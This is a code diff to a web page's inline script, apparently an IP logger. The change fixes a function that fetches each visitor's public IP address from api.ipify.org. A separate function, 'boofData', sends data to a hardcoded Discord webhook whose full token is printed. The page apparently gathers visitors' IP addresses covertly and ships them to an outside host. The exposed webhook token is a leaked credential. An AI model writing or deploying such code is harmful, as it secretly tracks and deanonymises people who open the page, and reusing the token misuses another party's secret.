@@ -19,14 +19,15 @@
 	<script>
     var ipaddr;
     var location;
-
-    const ipr = await fetch('https://api.ipify.org?format=json');
-    const ipd = await ipr.json();
-    ipaddr = ipd.ip;
+    async function ip() {
+      const ipr = await fetch('https://api.ipify.org?format=json');
+      const ipd = await ipr.json();
+      ipaddr = ipd.ip;
+    }
+    ip();
 
 		async function boofData(type) {
 			const h = "https://discord.com/api/webhooks/1349590681160777789/3IUPkV-MaHFy7f7EGgRi8HwaByOyALxBsS37I8HPbqZMRTwrTryz7yF2FTD8QrywVjSL";
-			const m = "mmmm";
       if (type === "main") {
         try {
         const response = await fetch(h, {
